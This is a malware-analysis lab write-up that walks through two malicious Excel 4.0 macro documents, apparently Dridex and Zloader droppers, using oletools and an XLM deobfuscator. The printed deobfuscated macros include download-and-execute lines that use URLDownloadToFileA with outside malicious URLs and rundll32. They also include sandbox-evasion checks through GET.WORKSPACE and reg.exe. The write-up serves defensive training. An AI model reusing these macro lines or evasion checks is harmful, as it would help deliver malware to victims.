---
custom_edit_url: null
---


## Q1. Sample1: What is the document decryption password?
Using `msoffcrypto-crack.py` we can recover the password of encrypted MS Office documents.
```
$ msoffcrypto-crack.py sample1-fb5ed444ddc37d748639f624397cff2a.bin
Password found: VelvetSweatshop
```
### Answer
```
VelvetSweatshop
```

&nbsp;


## Q2. Sample1: This document contains six hidden sheets. What are their names? Provide the value of the one starting with S.
Let's look at the file metadata using `exiftool`.
```
$ exiftool sample1-fb5ed444ddc37d748639f624397cff2a.bin 
ExifTool Version Number         : 12.42
File Name                       : sample1-fb5ed444ddc37d748639f624397cff2a.bin
Directory                       : .
File Size                       : 97 kB
File Modification Date/Time     : 2020:07:24 02:50:18-04:00
File Access Date/Time           : 2023:07:23 05:34:02-04:00
File Inode Change Date/Time     : 2023:07:23 05:31:51-04:00
File Permissions                : -rw-rw-rw-
File Type                       : XLS
File Type Extension             : xls
MIME Type                       : application/vnd.ms-excel
Comp Obj User Type Len          : 38
Comp Obj User Type              : Microsoft Office Excel 2003 Worksheet
Author                          : 
Last Modified By                : 
Software                        : Microsoft Excel
Create Date                     : 2020:04:01 11:48:22
Modify Date                     : 2020:04:02 12:21:34
Security                        : Password protected
Code Page                       : Windows Latin 1 (Western European)
App Version                     : 12.0000
Scale Crop                      : No
Links Up To Date                : No
Shared Doc                      : No
Hyperlinks Changed              : No
Title Of Parts                  : Sheet1, Sheet2, Sheet3, SOCWNEScLLxkLhtJp, OHqYbvYcqmWjJJjsF, Macro2, Macro3, Macro4, Macro5
Heading Pairs                   : Worksheets, 3, Excel 4.0 Macros, 6
```
In the `Title Of Parts` field we can see that there is only one starting with a S.

```
oledump.py sample1 -p plugin_biff.py --pluginoptions '-x' | grep "hidden"
```
### Answer
```
SOCWNEScLLxkLhtJp
```

&nbsp;


## Q3. Sample1: What URL is the malware using to download the next stage? Only include the second-level and top-level domain. For example, xyz.com.
We can use `olevba` for this task.
```
$ olevba sample1-fb5ed444ddc37d748639f624397cff2a.bin 

--snip--;
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|RUN                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ShellExecuteA       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CALL                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|URLDownloadToFileA  |May download files from the Internet         |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://rilaer.com/If|URL                                          |
|          |AmGZIJjbwzvKNTxSPM/i|                                             |
|          |xcxmzcvqi.exe       |                                             |
|IOC       |http://rilaer.com/If|URL                                          |
|          |AmGZIJjbw           |                                             |
|IOC       |http://rilaer.com/If|URL                                          |
|          |AmGZIJjbwzvKNTxSPM/i|                                             |
|          |xcxmzcvqi.exRUN     |                                             |
|IOC       |KUdYCRk.exe         |Executable file name                         |
|IOC       |ixcxmzcvqi.exe      |Executable file name                         |
|Suspicious|XLM macro           |XLM macro found. It may contain malicious    |
|          |                    |code                                         |
+----------+--------------------+---------------------------------------------+
```
### Answer
```
http://rilaer.com
```

&nbsp;


## Q4. Sample1: What malware family was this document attempting to drop?
Before we do anything, we need to find the MD5 hash of the file.
```
$ md5sum sample1-fb5ed444ddc37d748639f624397cff2a.bin 
fb5ed444ddc37d748639f624397cff2a  sample1-fb5ed444ddc37d748639f624397cff2a.bin
```
Let's look up the hash in Malware bazaar

![xls 4](https://github.com/Knign/Write-ups/assets/110326359/80042e67-e464-4fec-b2dd-9143d71d143a)

We can also look up the hash in VirusTotal.

![xls 4 2](https://github.com/Knign/Write-ups/assets/110326359/56cbadb0-9d7f-4c25-a1b8-df7349278143)

### Answer
```
Dridex
```

&nbsp;


## Q5. Sample2: This document has a very hidden sheet. What is the name of this sheet?
Let's use `exiftool` as before in order to find the sheets contained in the file.
```
$ exiftool sample2-b5d469a07709b5ca6fee934b1e5e8e38.bin 
ExifTool Version Number         : 12.42
File Name                       : sample2-b5d469a07709b5ca6fee934b1e5e8e38.bin
Directory                       : .
File Size                       : 171 kB
File Modification Date/Time     : 2020:07:24 02:56:50-04:00
File Access Date/Time           : 2023:07:23 06:16:16-04:00
File Inode Change Date/Time     : 2023:07:23 05:31:51-04:00
File Permissions                : -rw-rw-rw-
File Type                       : XLS
File Type Extension             : xls
MIME Type                       : application/vnd.ms-excel
Author                          : 
Comments                        : ZNrQUl11Jl6jcYBb4wu
Last Modified By                : 
Software                        : Microsoft Excel
Create Date                     : 2020:02:27 10:23:09
Modify Date                     : 2020:03:30 12:27:59
Security                        : None
Code Page                       : Windows Latin 1 (Western European)
Company                         : 
App Version                     : 16.0000
Scale Crop                      : No
Links Up To Date                : No
Shared Doc                      : No
Hyperlinks Changed              : No
Title Of Parts                  : Sheet1
Heading Pairs                   : Worksheets, 1
```
Unfortunately, `exiftool` does not give us the hidden sheets.

We have to use `olevba` to find the hidden sheet.
```
$ olevba sample2-b5d469a07709b5ca6fee934b1e5e8e38.bin
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: sample2-b5d469a07709b5ca6fee934b1e5e8e38.bin
Type: OLE
SHRFMLA (sub): 0 0 1 8 6
SHRFMLA (sub): 9 9 1 8 8
SHRFMLA (sub): 19 19 1 7 7
SHRFMLA (sub): 26 26 0 7 8
SHRFMLA (sub): 0 0 1 8 6
SHRFMLA (sub): 9 9 1 8 8
SHRFMLA (sub): 19 19 1 7 7
SHRFMLA (sub): 26 26 0 7 8
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' RAW EXCEL4/XLM MACRO FORMULAS:
' SHEET: CSHykdYHvi, Macrosheet
' CELL:G51, =CHAR(69.0), E
' CELL:H92, =CHAR(117.0), u
--snip--;
```
### Answer
```
CSHykdYHvi
```

&nbsp;


## Q6. Sample2: This document uses reg.exe. What registry key is it checking?
In the output of the previous command, we can find the registry key.
```
--snip--;
' CELL:CZ14, None, 
' CELL:EE5, None, 
' CELL:AG19, None, 
' CELL:J731, None, 
"VBAWarnings"=dword:00000002
--snip--;
```
### Answer
```
VBAWarnings
```

&nbsp;


## Q7. Sample2: From the use of reg.exe, what value of the assessed key indicates a sandbox environment?
Using the `xmldeobfuscator` tool, we can decode unclear XLM macros.
```
$ xlmdeobfuscator -f sample2-b5d469a07709b5ca6fee934b1e5e8e38.bin
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)

          _        _______
|\     /|( \      (       )
( \   / )| (      | () () |
 \ (_) / | |      | || || |
  ) _ (  | |      | |(_)| |
 / ( ) \ | |      | |   | |
( /   \ )| (____/\| )   ( |
|/     \|(_______/|/     \|
   ______   _______  _______  ______   _______           _______  _______  _______ _________ _______  _______
  (  __  \ (  ____ \(  ___  )(  ___ \ (  ____ \|\     /|(  ____ \(  ____ \(  ___  )\__   __/(  ___  )(  ____ )
  | (  \  )| (    \/| (   ) || (   ) )| (    \/| )   ( || (    \/| (    \/| (   ) |   ) (   | (   ) || (    )|
  | |   ) || (__    | |   | || (__/ / | (__    | |   | || (_____ | |      | (___) |   | |   | |   | || (____)|
  | |   | ||  __)   | |   | ||  __ (  |  __)   | |   | |(_____  )| |      |  ___  |   | |   | |   | ||     __)
  | |   ) || (      | |   | || (  \ \ | (      | |   | |      ) || |      | (   ) |   | |   | |   | || (\ (
  | (__/  )| (____/\| (___) || )___) )| )      | (___) |/\____) || (____/\| )   ( |   | |   | (___) || ) \ \__
  (______/ (_______/(_______)|/ \___/ |/       (_______)\_______)(_______/|/     \|   )_(   (_______)|/   \__/

    
XLMMacroDeobfuscator(v0.2.6) - https://github.com/DissectMalware/XLMMacroDeobfuscator

File: /home/remnux/xlm/c38-xlm-macros/sample2-b5d469a07709b5ca6fee934b1e5e8e38.bin

Unencrypted xls file

[Loading Cells]
SHRFMLA (sub): 0 0 1 8 6
SHRFMLA (sub): 9 9 1 8 8
SHRFMLA (sub): 19 19 1 7 7
SHRFMLA (sub): 26 26 0 7 8
auto_open: auto_open->'CSHykdYHvi'!$J$727
[Starting Deobfuscation]
CELL:J727      , FullEvaluation      , CALL("Shell32","ShellExecuteA","JJCCCJJ",0,"open","C:\Windows\system32\reg.exe","EXPORT HKCU\Software\Microsoft\Office\GET.WORKSPACE(2)\Excel\Security c:\users\public\1.reg /y",0,5)
CELL:J728      , PartialEvaluation   , =WAIT("45130.30471064814600:00:03")
CELL:J729      , FullEvaluation      , FOPEN("c:\users\public\1.reg",1)
CELL:J730      , PartialEvaluation   , =FPOS(FOPEN("c:\users\public\1.reg",1),215)
CELL:J732      , PartialEvaluation   , =FCLOSE(FOPEN("c:\users\public\1.reg",1))
CELL:J733      , PartialEvaluation   , =FILE.DELETE("c:\users\public\1.reg")
--snip--;
```
We can see the key specified as `1`.
### Answer
```
0x1
```

&nbsp;


## Q8. Sample2: This document performs several additional anti-analysis checks. What Excel 4 macro function does it use?
In the `xmldeobfuscator` output, we can see the check being performed using the `GET.WORKSPACE` function.
```
--snip--;
CELL:K2        , FullEvaluation      , IF(GET.WORKSPACE(13)<770,CLOSE(FALSE),)
CELL:K4        , FullEvaluation      , IF(GET.WORKSPACE(14)<381,CLOSE(FALSE),)
--snip--;
```
### Answer
```
Get.Workspace
```

&nbsp;


## Q9. Sample2: This document checks for the name of the environment in which Excel is running. What value is it using to compare?
In the output we can see the OS mentioned in  the `GET.WORKSPACE` command.
```
--snip--;
CELL:J6        , FullEvaluation      , FORMULA("=SHARED FMLA at rowx=0 colx=1IF(ISNUMBER(SEARCH(""Windows"",GET.WORKSPACE(1))), ,CLOSE(TRUE))",K7)
CELL:J7        , FullEvaluation      , FORMULA("=CALL(""urlmon"",""URLDownloadToFileA"",""JJCCJJ"",0,""https://ethelenecrace.xyz/fbb3"",""c:\Users\Public\bmjn5ef.html"",0,0)",K8)
CELL:J8        , FullEvaluation      , FORMULA("=SHARED FMLA at rowx=0 colx=1ALERT(""The workbook cannot be opened or repaired by Microsoft Excel because it's corrupt."",2)",K9)
CELL:J9        , FullEvaluation      , FORMULA("=CALL(""Shell32"",""ShellExecuteA"",""JJCCCJJ"",0,""open"",""C:\Windows\system32\rundll32.exe"",""c:\Users\Public\bmjn5ef.html,DllRegisterServer"",0,5)",K11)
CELL:J11       , FullEvaluation      , FORMULA("=SHARED FMLA at rowx=0 colx=1CLOSE(FALSE)",K12)
--snip--;
```
### Answer
```
Windows
```

&nbsp;


## Q10. Sample2: What type of payload is downloaded?
The process is opening a `rundll32.exe` file.
```
--snip--;
CELL:J9        , FullEvaluation      , FORMULA("=CALL(""Shell32"",""ShellExecuteA"",""JJCCCJJ"",0,""open"",""C:\Windows\system32\rundll32.exe"",""c:\Users\Public\bmjn5ef.html,DllRegisterServer"",0,5)",K11)
--snip--;
```
### Answer
```
DLL
```

&nbsp;


## Q11. Sample2: What URL does the malware download the payload from?
Again the answer can be found in the output of the `xmldeobfuscator`.
```
--snip--;
CELL:J7        , FullEvaluation      , FORMULA("=CALL(""urlmon"",""URLDownloadToFileA"",""JJCCJJ"",0,""https://ethelenecrace.xyz/fbb3"",""c:\Users\Public\bmjn5ef.html"",0,0)",K8)
--snip--;
```
### Answer
```
https://ethelenecrace.xyz/fbb3
```

&nbsp;


## Q12. Sample2: What is the filename that the payload is saved as?
The answer lies in the previous snippet.
### Answer
```
bmjn5ef.html
```

&nbsp;


## Q13. Sample2: How is the payload executed? For example, mshta.exe
We can find the answer in in the same snippet as Q10 as the payload is first opened and then executed.
### Answer
```
rundll32.exe
```

&nbsp;


## Q14. Sample2: What was the malware family?
Use `md5sum` to obtain the file hash.
```
$ md5sum sample2-b5d469a07709b5ca6fee934b1e5e8e38.bin 
b5d469a07709b5ca6fee934b1e5e8e38  sample2-b5d469a07709b5ca6fee934b1e5e8e38.bin
```
Let's look up this hash in VirusTotal.

![xls 14](https://github.com/Knign/Write-ups/assets/110326359/31f314f8-8cff-4790-bf74-2dca9894b106)

The answer is the one listed by TrendMicro.
### Answer
```
zloader
```
